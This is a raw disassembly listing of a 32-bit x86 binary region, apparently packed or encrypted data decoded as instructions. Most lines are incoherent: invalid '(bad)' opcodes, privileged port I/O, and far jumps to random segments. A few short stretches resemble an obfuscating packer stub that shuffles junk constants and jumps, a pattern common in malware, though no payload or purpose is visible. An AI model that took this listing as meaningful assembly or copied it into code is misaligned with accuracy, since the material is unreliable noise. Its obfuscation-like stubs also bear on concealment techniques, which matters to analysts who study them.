  40e239:	in     eax,0xec
  40e23b:	mov    al,ds:0xafbd4ce6
  40e240:	popf   
  40e241:	jb     0x40e206
  40e243:	lods   eax,DWORD PTR ds:[esi]
  40e244:	pop    ss
  40e245:	push   es
  40e246:	dec    edi
  40e247:	xor    BYTE PTR [edx-0x48],al
  40e24a:	cmp    DWORD PTR ds:[esi+0x54],eax
  40e24e:	inc    edx
  40e24f:	arpl   WORD PTR [edi-0x7de9c340],bx
  40e255:	cmp    al,0x8a
  40e257:	cmp    dh,BYTE PTR [ebp-0x645b4efe]
  40e25d:	(bad)  
  40e25e:	ret    0x69b2
  40e261:	ror    eax,0xf8
  40e264:	in     eax,dx
  40e265:	push   cs
  40e266:	mov    ah,0x8e
  40e268:	mov    eax,ds:0xef3a8ce5
  40e26d:	inc    esp
  40e26e:	lods   eax,DWORD PTR ds:[esi]
  40e26f:	push   eax
  40e270:	or     bh,0xc1
  40e273:	xchg   edi,eax
  40e274:	or     eax,0x27dd82dc
  40e279:	jns    0x40e23b
  40e27b:	cmp    al,dl
  40e27d:	out    0x8d,al
  40e27f:	aad    0xe8
  40e281:	lods   eax,DWORD PTR ds:[esi]
  40e282:	mov    eax,0x2957c4cd
  40e287:	jae    0x40e2fd
  40e289:	mov    esp,0x4ad5b761
  40e28e:	jmp    0x5f2b:0x6a302c37
  40e295:	jno    0x40e292
  40e297:	dec    ecx
  40e298:	sbb    al,0xde
  40e29a:	fwait
  40e29b:	fs sub al,0xe9
  40e29e:	loopne 0x40e225
  40e2a0:	cmp    eax,0xfb904c34
  40e2a5:	nop
  40e2a6:	dec    esp
  40e2a7:	loope  0x40e289
  40e2a9:	emms   
  40e2ab:	daa    
  40e2ac:	xchg   BYTE PTR [eax*2-0x1d70bca],ch
  40e2b3:	(bad)  
  40e2b4:	xor    BYTE PTR [eax-0xb],al
  40e2b7:	fistp  DWORD PTR [eax-0xb1c8d90]
  40e2bd:	sub    DWORD PTR [ebx+0x4b],esi
  40e2c0:	xor    DWORD PTR [esi],esp
  40e2c2:	xchg   ebp,eax
  40e2c3:	dec    edi
  40e2c4:	in     al,0x1
  40e2c6:	jmp    0xc30679bf
  40e2cb:	adc    eax,0x225968af
  40e2d0:	in     al,0x6a
  40e2d2:	sbb    al,0x1c
  40e2d4:	sahf   
  40e2d5:	call   0x2555e9d1
  40e2da:	outs   dx,DWORD PTR ds:[esi]
  40e2db:	gs jbe 0x40e305
  40e2de:	sar    dh,cl
  40e2e0:	rcl    BYTE PTR [ebx+0x571e0688],cl
  40e2e6:	lods   eax,DWORD PTR ds:[esi]
  40e2e7:	pushw  ds
  40e2e9:	outs   dx,BYTE PTR ds:[esi]
  40e2ea:	pop    edx
  40e2eb:	(bad)  
  40e2ec:	mov    ch,0x60
  40e2ee:	push   ecx
  40e2ef:	(bad)  
  40e2f0:	call   0x7c4b7d2a
  40e2f5:	daa    
  40e2f6:	mov    dh,0x81
  40e2f8:	cli    
  40e2f9:	jae    0x40e347
  40e2fb:	mov    cl,0x53
  40e2fd:	pop    ebx
  40e2fe:	push   ss
  40e2ff:	arpl   WORD PTR ds:0xe653cc2f,dx
  40e305:	and    edi,DWORD PTR [ebp+0x5c6f0f9d]
  40e30b:	retf   
  40e30c:	stos   BYTE PTR es:[edi],al
  40e30d:	push   eax
  40e30e:	mov    eax,DWORD PTR [ebx]
  40e310:	aam    0x59
  40e312:	ret    0xbe8b
  40e315:	nop
  40e316:	push   sp
  40e318:	dec    eax
  40e319:	sbb    dh,BYTE PTR [ebx-0x37]
  40e31c:	in     eax,dx
  40e31d:	jle    0x40e300
  40e31f:	mov    ah,0x7e
  40e321:	pusha  
  40e322:	int3   
  40e323:	mov    edi,0x54587c5c
  40e328:	pop    ebp
  40e329:	out    dx,eax
  40e32a:	xlat   BYTE PTR ds:[ebx]
  40e32b:	aas    
  40e32c:	pop    ss
  40e32d:	scas   eax,DWORD PTR es:[edi]
  40e32e:	shl    edx,1
  40e330:	shl    edx,cl
  40e332:	(bad)  
  40e333:	test   DWORD PTR [edi+0x19],edx
  40e336:	push   eax
  40e337:	fs jnp 0x40e34b
  40e33a:	mov    dl,0x4d
  40e33c:	jecxz  0x40e345
  40e33e:	add    ebx,ebx
  40e340:	xor    al,0xab
  40e343:	mov    ch,BYTE PTR [ebx-0x78]
  40e346:	icebp  
  40e347:	pop    edx
  40e348:	sub    BYTE PTR [ebp*2-0x5a651461],dl
  40e34f:	add    eax,esi
  40e351:	jns    0x40e381
  40e353:	mov    ds:0x4fb8fd86,eax
  40e358:	or     BYTE PTR [eax],bl
  40e35a:	into   
  40e35b:	push   ss
  40e35c:	push   es
  40e35d:	cmp    bh,bl
  40e35f:	retf   0xc77f
  40e362:	es xor al,0x80
  40e365:	lds    ebp,FWORD PTR [edx-0x6f1c3313]
  40e36b:	in     eax,dx
  40e36c:	dec    edx
  40e36d:	lea    ebp,[ebp-0x3b5fcbe8]
  40e373:	xor    BYTE PTR [eax+0x34b61bdf],ah
  40e379:	or     esi,DWORD PTR [eax+0x4d]
  40e37c:	xchg   edi,eax
  40e37d:	pop    edx
  40e37e:	(bad)
  40e382:	xor    eax,0x908c7925
  40e387:	xor    al,0xf1
  40e389:	push   es
  40e38a:	adc    BYTE PTR [ecx+0x3a9f56a6],ah
  40e390:	add    esi,DWORD PTR [ebx]
  40e392:	or     al,BYTE PTR [ebp+0xc]
  40e395:	jp     0x40e409
  40e397:	outs   dx,DWORD PTR ds:[esi]
  40e398:	loope  0x40e34b
  40e39a:	xchg   esi,eax
  40e39b:	call   0xdbaa53ee
  40e3a0:	pusha  
  40e3a1:	retf   0x9d45
  40e3a4:	jmp    0xc5e857db
  40e3a9:	push   0xffffffda
  40e3ab:	pop    es
  40e3ac:	push   ecx
  40e3ad:	or     edx,DWORD PTR [eax]
  40e3af:	cdq    
  40e3b0:	ss dec ebx
  40e3b2:	cmp    eax,0x98497d7b
  40e3b7:	cdq    
  40e3b8:	mov    ecx,0x3cb8cf19
  40e3bd:	or     DWORD PTR ds:0x1bed2a8b,edi
  40e3c3:	lds    edx,FWORD PTR [eax-0x7d]
  40e3c6:	es cmc 
  40e3c8:	icebp  
  40e3c9:	ds add al,0xe
  40e3cc:	or     edi,ecx
  40e3ce:	inc    ecx
  40e3cf:	and    DWORD PTR [edi-0x41],0x60
  40e3d3:	cs inc esp
  40e3d5:	or     ah,0xbb
  40e3d8:	pop    eax
  40e3d9:	jmp    0xa4b6:0x4dd9a025
  40e3e0:	jl     0x40e3ec
  40e3e2:	cwde   
  40e3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3e4:	stos   BYTE PTR es:[edi],al
  40e3e5:	(bad)  
  40e3e6:	cmp    esi,DWORD PTR [ebx+0x79890346]
  40e3ec:	jae    0x40e44f
  40e3ee:	inc    esi
  40e3ef:	sub    DWORD PTR [ebp+0x17],eax
  40e3f2:	jo     0x40e38a
  40e3f4:	test   DWORD PTR [edx],0x91571141
  40e3fa:	sbb    DWORD PTR [edi+ecx*8+0x21],ebp
  40e3fe:	inc    edx
  40e3ff:	jns    0x40e3d5
  40e401:	pusha  
  40e402:	or     BYTE PTR [ecx],ch
  40e404:	aas    
  40e405:	shr    BYTE PTR [ebx+0x10],1
  40e408:	and    BYTE PTR [esp+eax*2],al
  40e40b:	jmp    0x8f3e:0x2fc575ab
  40e412:	js     0x40e409
  40e414:	out    0x23,al
  40e416:	dec    ecx
  40e417:	cmp    ebx,DWORD PTR [ebx]
  40e419:	test   DWORD PTR [esi+0x68],edi
  40e41c:	xchg   edx,eax
  40e41d:	imul   ecx,DWORD PTR [ebx-0x6a2b5323],0x7a
  40e424:	sti    
  40e425:	or     DWORD PTR [ecx+0x21],edi
  40e428:	or     DWORD PTR [esi+0x1d82c603],eax
  40e42e:	gs ffree st(7)
  40e431:	inc    edx
  40e432:	shl    BYTE PTR [edi+0x37],cl
  40e435:	in     al,dx
  40e436:	adc    al,0x1f
  40e438:	or     eax,0xb05b0fdb
  40e43d:	pop    esp
  40e43e:	iret   
  40e43f:	lahf   
  40e440:	scas   al,BYTE PTR es:[edi]
  40e441:	lock fs mov bl,0xec
  40e445:	fisttp DWORD PTR [ecx+0x47]
  40e448:	call   FWORD PTR [ebx-0x40]
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax-0x41d46917],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [eax+0x14f666e4],al
  40e4ef:	retf   0x5fa2
  40e4f2:	xchg   edi,eax
  40e4f3:	jmp    0x40e49d
  40e4f5:	inc    ebx
  40e4f6:	inc    ecx
  40e4f7:	dec    ebx
  40e4f8:	inc    edx
  40e4f9:	mov    ss,WORD PTR [esi+edx*1-0x28]
  40e4fd:	dec    edi
  40e4fe:	push   eax
  40e4ff:	sbb    DWORD PTR [ebp+0x7b68477e],esp
  40e505:	jg     0x40e530
  40e507:	rol    BYTE PTR [edi],cl
  40e509:	fimul  DWORD PTR [edx+0x468030da]
  40e50f:	repz arpl WORD PTR [edx+0x7b],si
  40e513:	sub    BYTE PTR ds:[edi-0x4b40bfb1],bh
  40e51a:	xchg   ebp,eax
  40e51b:	adc    DWORD PTR [ebp+0x18b68070],edx
  40e521:	mov    esp,0xf3511039
  40e526:	push   0x64
  40e528:	(bad)  
  40e529:	push   esp
  40e52a:	fst    QWORD PTR [ecx]
  40e52c:	mov    al,ds:0x36d0f7e9
  40e531:	mov    ah,BYTE PTR [edx]
  40e533:	cmp    al,0xb4
  40e535:	sub    eax,0xc5c59e77
  40e53a:	mov    ah,0xac
  40e53c:	add    BYTE PTR [ebp-0x61],dh
  40e53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e540:	(bad)  
  40e541:	cmc    
  40e542:	and    eax,0x6b332b52
  40e547:	sbb    al,0xc
  40e549:	jle    0x40e57e
  40e54b:	jns    0x40e5a0
  40e54d:	pop    eax
  40e54e:	jbe    0x40e4ff
  40e550:	outs   dx,DWORD PTR fs:[esi]
  40e552:	(bad)  
  40e553:	idiv   DWORD PTR [ebp-0x38261c0b]
  40e559:	or     DWORD PTR [eax+esi*8+0x45],eax
  40e55d:	js     0x40e5b4
  40e55f:	mov    dl,0x6a
  40e561:	sub    BYTE PTR [esi+0x57],ah
  40e564:	test   DWORD PTR [ebp+0x68],ebp
  40e567:	in     al,dx
  40e568:	jne    0x40e5df
  40e56a:	xchg   edx,eax
  40e56b:	cs inc esp
  40e56d:	dec    esp
  40e56e:	lea    eax,[eax]
  40e570:	xchg   ecx,eax
  40e571:	inc    edx
  40e572:	hlt    
  40e573:	les    esi,FWORD PTR [eax+0x5ce29f48]
  40e579:	mov    ds:0x5aa8128,al
  40e57e:	stos   BYTE PTR es:[edi],al
  40e57f:	les    ecx,FWORD PTR [eax-0x72]
  40e582:	out    dx,al
  40e583:	adc    esi,DWORD PTR [edx+0x17ec0dbd]
  40e589:	adc    al,0xa4
  40e58b:	mov    bl,0xb5
  40e58d:	aam    0xcf
  40e58f:	xor    dh,0x3a
  40e592:	hlt    
  40e593:	(bad)  
  40e594:	fwait
  40e595:	xchg   ebp,eax
  40e596:	mov    ebp,0x8283571c
  40e59b:	and    al,0x9e
  40e59d:	lea    edi,[esi-0x9]
  40e5a0:	mov    dl,dh
  40e5a2:	out    dx,al
  40e5a3:	aaa    
  40e5a4:	pop    edi
  40e5a5:	(bad)  
  40e5a6:	fcom   DWORD PTR [eax+0x2b720983]
  40e5ac:	jmp    0x75cc:0x3a38526
  40e5b3:	ins    DWORD PTR es:[edi],dx
  40e5b4:	jne    0x40e5af
  40e5b6:	push   ebp
  40e5b7:	loope  0x40e57a
  40e5b9:	pop    ecx
  40e5ba:	or     ecx,eax
  40e5bc:	(bad)  
  40e5be:	imul   esi,DWORD PTR [eax+0x15],0xffffffda
  40e5c2:	div    DWORD PTR [ebp-0x7d]
  40e5c5:	fs (bad) 
  40e5c7:	mul    BYTE PTR [edi-0x257172dd]
  40e5cd:	iret   
  40e5ce:	jbe    0x40e5be
  40e5d0:	and    DWORD PTR [ebx-0x1e1d47ff],ebx
  40e5d6:	add    DWORD PTR [ecx-0x1379f612],edx
  40e5dc:	or     al,0x61
  40e5de:	dec    ebp
  40e5df:	inc    ebp
  40e5e0:	xor    dh,al
  40e5e2:	pop    es
  40e5e3:	fsubp  st(3),st
  40e5e5:	repz jg 0x40e657
  40e5e8:	adc    edx,edi
  40e5ea:	mov    ecx,DWORD PTR [ebx-0x35]
  40e5ed:	stc    
  40e5ee:	dec    esi
  40e5ef:	jne    0x40e647
  40e5f1:	push   esi
  40e5f2:	or     eax,esi
  40e5f4:	sahf   
  40e5f5:	fsubr  DWORD PTR [esi-0x7a206968]
  40e5fb:	add    al,0x6e
  40e5fd:	pop    ecx
  40e5fe:	xchg   esi,esp
  40e600:	and    ah,dl
  40e602:	inc    ebp
  40e603:	fdiv   DWORD PTR [ebx+0x2f]
  40e606:	clc    
  40e607:	pusha  
  40e608:	ja     0x40e632
  40e60a:	jae    0x40e5a1
  40e60c:	pop    edx
  40e60d:	in     al,0x1a
  40e60f:	sbb    DWORD PTR [ebx+0x40],eax
  40e612:	retf   
  40e613:	cmp    cl,BYTE PTR [edi]
  40e615:	gs or  ebp,ebx
  40e618:	jmp    0x40e619
  40e61a:	inc    esi
  40e61b:	sti    
  40e61c:	xchg   bl,dl
  40e61e:	xchg   esi,eax
  40e61f:	arpl   WORD PTR [edx+0x28],cx
  40e622:	cmc    
  40e623:	les    esi,FWORD PTR [eax]
  40e625:	cld    
  40e626:	cs fucomip st,st(6)
  40e629:	sub    ch,BYTE PTR [ebx+0x1d]
  40e62c:	aam    0x9f
  40e62e:	ins    WORD PTR es:[edi],dx
  40e630:	mov    esi,ebx
  40e632:	mov    bl,0xa5
  40e634:	pop    esp
  40e635:	(bad)  
  40e637:	adc    BYTE PTR [eax],al
  40e639:	fst    QWORD PTR [edx]
  40e63b:	ss xchg ecx,eax
  40e63d:	cmp    eax,DWORD PTR [edx]
  40e63f:	or     BYTE PTR [edi+0xe],0xd6
  40e643:	pop    edx
  40e644:	jle    0x40e5c7
  40e646:	inc    ecx
  40e647:	or     dl,BYTE PTR [ebp-0x10c0d589]
  40e64d:	(bad)  
  40e64e:	mov    cl,0x58
  40e650:	add    al,0xed
  40e652:	add    BYTE PTR [ebp+0x4950ad1a],dl
  40e658:	scas   eax,DWORD PTR es:[edi]
  40e659:	push   edx
  40e65a:	mov    eax,ds:0x2e7abd33
  40e65f:	pop    ds
  40e660:	ret    0x402c
  40e663:	sbb    esi,DWORD PTR [edi+0x75]
  40e666:	inc    eax
  40e667:	iret   
  40e668:	mov    bh,0x74
  40e66b:	mov    dh,0x66
  40e66d:	test   al,bl
  40e66f:	loop   0x40e626
  40e671:	add    esp,DWORD PTR [ecx-0x12]
  40e674:	les    ebx,FWORD PTR [edx+0x5960dce9]
  40e67a:	sbb    ebx,edi
  40e67c:	adc    eax,0xf1abbe67
  40e681:	add    al,0x85
  40e683:	or     al,0xca
  40e685:	inc    eax
  40e686:	sub    esi,DWORD PTR [esi-0x5985d1b3]
  40e68c:	xchg   DWORD PTR [ebx+0x18],ecx
  40e68f:	scas   al,BYTE PTR es:[edi]
  40e690:	fcmovbe st,st(5)
  40e692:	call   0xf900c5a1
  40e697:	pop    ecx
  40e698:	rol    edi,1
  40e69a:	sub    al,0xf6
  40e69c:	xchg   ebp,eax
  40e69d:	pop    ebx
  40e69e:	dec    ebx
  40e69f:	xchg   esp,eax
  40e6a0:	lods   eax,DWORD PTR ds:[esi]
  40e6a1:	adc    DWORD PTR [eax-0x60],0xaa8a8d7a
  40e6a8:	dec    edx
  40e6a9:	mov    dh,0xdd
  40e6ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6ac:	pop    es
  40e6ad:	scas   eax,DWORD PTR es:[edi]
  40e6ae:	lods   eax,DWORD PTR ds:[esi]
  40e6af:	mov    cl,0x67
  40e6b1:	outs   dx,DWORD PTR ds:[esi]
  40e6b2:	(bad)  
  40e6b3:	loope  0x40e687
  40e6b5:	xor    ecx,DWORD PTR [ebp+0x19]
  40e6b8:	lea    edi,[ecx+0xbd5f7b9]
  40e6be:	push   edi
  40e6bf:	(bad)  
  40e6c0:	or     esp,DWORD PTR [edi]
  40e6c2:	dec    esi
  40e6c3:	or     dh,dl
  40e6c5:	inc    esp
  40e6c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6c7:	add    eax,0xa3eee8ec
  40e6cc:	cmp    BYTE PTR [ecx+0x50e22a],ch
  40e6d2:	scas   al,BYTE PTR es:[edi]
  40e6d3:	jecxz  0x40e708
  40e6d5:	jp     0x40e6eb
  40e6d7:	stos   BYTE PTR es:[edi],al
  40e6d8:	lock dec ecx
  40e6da:	pop    edx
  40e6db:	lods   al,BYTE PTR ds:[esi]
  40e6dc:	jge    0x40e708
  40e6de:	mov    al,ds:0x2cfc12a5
  40e6e3:	clc    
  40e6e4:	fbld   TBYTE PTR [ebx+eax*2]
  40e6e7:	inc    esi
  40e6e8:	adc    cl,BYTE PTR ds:0x1ba47545
  40e6ee:	dec    edx
  40e6ef:	lahf   
  40e6f0:	lahf   
  40e6f1:	sub    eax,0x792c0df5
  40e6f6:	mov    bl,0xe1
  40e6f8:	cmp    al,0x1
  40e6fa:	in     al,0x58
  40e6fc:	inc    esp
  40e6fd:	dec    edi
  40e6fe:	pop    es
  40e6ff:	in     eax,dx
  40e700:	test   al,0x63
  40e702:	fwait
  40e703:	mov    eax,0xc5bc1ed8
  40e708:	inc    eax
  40e709:	mov    ecx,0x691f6370
  40e70e:	scas   al,BYTE PTR es:[edi]
  40e70f:	mov    BYTE PTR [edi],dh
  40e711:	outs   dx,DWORD PTR ds:[esi]
  40e712:	add    BYTE PTR [ebx-0x3c4c85dd],dl
  40e718:	fistp  WORD PTR [ecx+edx*8]
  40e71b:	and    eax,0x410761b0
  40e720:	sub    edi,DWORD PTR [ecx]
  40e722:	inc    eax
  40e723:	ss out dx,eax
  40e725:	sbb    ebx,ebx
  40e727:	and    dl,BYTE PTR [eax+eax*1-0x495dcffd]
  40e72e:	adc    DWORD PTR [ecx+0x1160d3df],eax
  40e734:	clc    
  40e735:	cmc    
  40e736:	leave  
  40e737:	mov    ebx,0x694242f9
  40e73c:	in     eax,dx
  40e73d:	daa    
  40e73e:	(bad)  
  40e73f:	retf   
  40e740:	jno    0x40e71f
  40e742:	jmp    0x6b71:0x2dc18237
  40e749:	shl    DWORD PTR [esi+0xa],cl
  40e74c:	cli    
  40e74d:	test   eax,0xcfcc028d
  40e752:	mov    al,ds:0xc90a5590
  40e757:	push   es
  40e758:	leave  
  40e759:	add    DWORD PTR ds:0x67e4ebf5,esp
  40e75f:	dec    ebp
  40e760:	add    eax,0xbfd96b0d
  40e765:	icebp  
  40e766:	jg     0x40e748
  40e768:	retf   0x1cf4
  40e76b:	retf   
  40e76c:	push   es
  40e76d:	in     al,dx
  40e76e:	mov    ds:0x994b1487,eax
  40e773:	xor    BYTE PTR [esi-0x3a],bh
  40e776:	hlt    
  40e777:	pushf  
  40e778:	gs fst st(1)
  40e77b:	aas    
  40e77c:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e77e:	mov    esp,0x93294568
  40e783:	and    bh,BYTE PTR [ebx+0x307b9f07]
  40e789:	adc    eax,0xdf301277
  40e78e:	cmp    ah,bl
  40e790:	jecxz  0x40e7bd
  40e792:	enter  0x45c7,0xc
  40e796:	ror    DWORD PTR [eax],cl
  40e798:	add    BYTE PTR [eax],al
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	dec    ecx
  40e7f0:	cwde   
  40e7f1:	cmp    eax,0x18be42be
  40e7f6:	sbb    dl,dl
  40e7f8:	adc    al,0x18
  40e7fa:	sbb    BYTE PTR [eax],al
  40e7fc:	ficomp DWORD PTR [esi+0x221511f6]
  40e802:	push   0x7e
  40e804:	mov    ch,0x31
  40e806:	add    eax,0x3188a8d7
  40e80b:	outs   dx,BYTE PTR ds:[esi]
  40e80c:	mov    esi,0x6c5e116d
  40e811:	xor    DWORD PTR [ebx-0x4f],edx
  40e814:	shr    DWORD PTR [edx+0x74],1
  40e817:	outs   dx,DWORD PTR ds:[esi]
  40e818:	ror    DWORD PTR [ecx],1
  40e81a:	mov    DWORD PTR [ecx+0x61078fb5],eax
  40e820:	inc    esp
  40e821:	and    edi,ebx
  40e823:	je     0x40e7b5
  40e825:	test   al,0x94
  40e827:	sbb    DWORD PTR [esi],esi
  40e829:	arpl   WORD PTR [edi],bp
  40e82b:	ds cdq 
  40e82d:	(bad)  
  40e82e:	push   ecx
  40e82f:	aad    0x9
  40e831:	jmp    0xe8b6:0x59fb6f18
  40e838:	lods   eax,DWORD PTR ds:[esi]
  40e839:	adc    BYTE PTR [edx],ch
  40e83b:	pop    ds
  40e83c:	or     al,0x7f
  40e83e:	leave  
  40e83f:	cli    
  40e840:	ins    BYTE PTR es:[edi],dx
  40e841:	mov    WORD PTR [ebx],cs
  40e843:	cld    
  40e844:	lods   al,BYTE PTR ds:[esi]
  40e845:	add    esi,DWORD PTR [edx-0x17]
  40e848:	add    BYTE PTR [ecx+0x56],bl
  40e84b:	pop    DWORD PTR [ebx]
  40e84d:	mov    al,0xe9
  40e84f:	jb     0x40e8b0
  40e851:	outs   dx,BYTE PTR ds:[esi]
  40e852:	sbb    eax,0x74c12fde
  40e857:	ror    DWORD PTR [eax-0x3eca0f0c],0x33
  40e85e:	arpl   WORD PTR [ecx-0x1d],dx
  40e861:	lock mov esp,0x8b2fd0f4
  40e867:	ret    0x7270
  40e86a:	mov    eax,0xc8ce86d6
  40e86f:	sub    DWORD PTR [edx+0x6244e671],0x26f7b065
  40e879:	add    BYTE PTR [ecx-0x3e],bh
  40e87c:	je     0x40e89c
  40e87e:	dec    edi
  40e87f:	push   ss
  40e880:	fdivr  DWORD PTR [ecx-0x3f889c3c]
  40e886:	jp     0x40e865
  40e888:	out    dx,eax
  40e889:	out    0x87,al
  40e88b:	mov    dh,0xbd
  40e88d:	daa    
  40e88e:	stos   BYTE PTR es:[edi],al
  40e88f:	sub    dh,bl
  40e891:	enter  0x17f0,0x44
  40e895:	xchg   BYTE PTR [ebx+0x309a4c33],dh
  40e89b:	out    0xba,al
  40e89d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e89e:	or     eax,0xdc86b70c
  40e8a3:	push   DWORD PTR [edx+0x31]
  40e8a6:	call   0x1aaffd9
  40e8ab:	cmp    ecx,eax
  40e8ad:	xlat   BYTE PTR ds:[ebx]
  40e8ae:	and    DWORD PTR [edx],0xffffffd7
  40e8b1:	xor    cl,BYTE PTR [edx]
  40e8b3:	sub    DWORD PTR [ebp+esi*4+0x552cb06a],edx
  40e8ba:	out    dx,eax
  40e8bb:	pop    ebp
  40e8bc:	or     cl,al
  40e8be:	dec    esi
  40e8bf:	and    dl,BYTE PTR ds:0xbf2e8426
  40e8c5:	out    0x34,eax
  40e8c7:	dec    esp
  40e8c8:	not    BYTE PTR ds:0xa0091a69
  40e8ce:	inc    BYTE PTR [esi]
  40e8d0:	fucomip st,st(0)
  40e8d2:	test   DWORD PTR [edi+0x4a6b136f],esi
  40e8d8:	mov    dl,0x7a
  40e8da:	retf   
  40e8db:	jg     0x40e8be
  40e8dd:	pop    ebx
  40e8de:	adc    eax,0xae6df32f
  40e8e3:	(bad)  
  40e8e4:	pop    edi
  40e8e5:	cmp    al,0x7c
  40e8e7:	stc    
  40e8e8:	adc    ebx,DWORD PTR [edx+edx*2+0x7dd19d49]
  40e8ef:	repnz sub BYTE PTR [esi],cl
  40e8f2:	add    ah,cl
  40e8f4:	xor    esp,DWORD PTR [eax]
  40e8f6:	je     0x40e8c7
  40e8f8:	jb     0x40e939
  40e8fa:	pop    ds
  40e8fb:	mov    eax,ds:0xbe286362
  40e900:	popa   
  40e901:	sbb    al,0x1a
  40e903:	ds loop 0x40e923
  40e906:	arpl   WORD PTR [eax+0x49f6a9c1],bx
  40e90c:	hlt    
  40e90d:	inc    ebx
  40e90e:	cdq    
  40e90f:	into   
  40e910:	jnp    0x40e98d
  40e912:	clc    
  40e913:	retf   0xbf51
  40e916:	mov    eax,0x19562004
  40e91b:	jno    0x40e967
  40e91d:	sbb    eax,0x8002960f
  40e922:	adc    al,0x32
  40e924:	mov    dh,0x72
  40e926:	ins    BYTE PTR es:[edi],dx
  40e927:	rcl    DWORD PTR [ebx-0x78cabc09],0x93
  40e92e:	jnp    0x40e9ac
  40e930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e931:	(bad)  
  40e933:	cmp    edx,DWORD PTR [esi+ebp*8-0x1b]
  40e937:	mov    edi,0xfe620de8
  40e93c:	xor    edi,DWORD PTR [esi]
  40e93e:	sbb    ah,BYTE PTR [esi-0x206d9508]
  40e944:	mov    edx,ds
  40e946:	jns    0x40e9af
  40e948:	stc    
  40e949:	aad    0x93
  40e94b:	inc    ebp
  40e94c:	imul   esi
  40e94e:	inc    esp
  40e94f:	in     al,0x42
  40e951:	jmp    0x8cfb:0xdd7e18f9
  40e958:	scas   eax,DWORD PTR es:[edi]
  40e959:	mov    bl,0xd2
  40e95b:	jge    0x40e91d
  40e95d:	adc    BYTE PTR [esi],dl
  40e95f:	adc    bh,BYTE PTR [edx+0x21af8ac]
  40e965:	das    
  40e966:	mov    al,0x8c
  40e968:	or     DWORD PTR [esi+0x7bef45a8],esp
  40e96e:	dec    edi
  40e96f:	xor    ecx,DWORD PTR [eax-0x18a67948]
  40e975:	cmp    al,BYTE PTR [ebx]
  40e977:	jo     0x40e94d
  40e979:	out    dx,eax
  40e97a:	dec    edi
  40e97b:	push   0x2aa7c044
  40e980:	test   DWORD PTR [ecx-0x2a],ebx
  40e983:	xor    eax,0x718a7076
  40e988:	out    dx,al
  40e989:	ins    DWORD PTR es:[edi],dx
  40e98a:	cmp    DWORD PTR [ebx],ecx
  40e98c:	popf   
  40e98d:	in     al,0x67
  40e98f:	dec    esi
  40e990:	fs stos BYTE PTR es:[edi],al
  40e992:	jg     0x40e9a8
  40e994:	and    al,0xd
  40e996:	or     BYTE PTR [ebx-0x6b795087],0x40
  40e99d:	inc    edi
  40e99e:	jg     0x40ea12
  40e9a0:	pusha  
  40e9a1:	inc    ebx
  40e9a2:	jmp    0x21ea:0x72bdb639
  40e9a9:	sbb    DWORD PTR fs:0xe78f9bf3,0xfffffff0
  40e9b1:	lahf   
  40e9b2:	and    eax,DWORD PTR cs:[esi-0x40d46a4a]
  40e9b9:	push   esp
  40e9ba:	adc    BYTE PTR [edi+0x1b],ah
  40e9bd:	mov    esp,0xd98c15ae
  40e9c2:	imul   edi,DWORD PTR [eax+0x6403de11],0xf5aacbf8
  40e9cc:	clc    
  40e9cd:	lahf   
  40e9ce:	pop    ebp
  40e9cf:	jb     0x40e99e
  40e9d1:	cld    
  40e9d2:	aas    
  40e9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9d4:	je     0x40e9b3
  40e9d6:	iret   
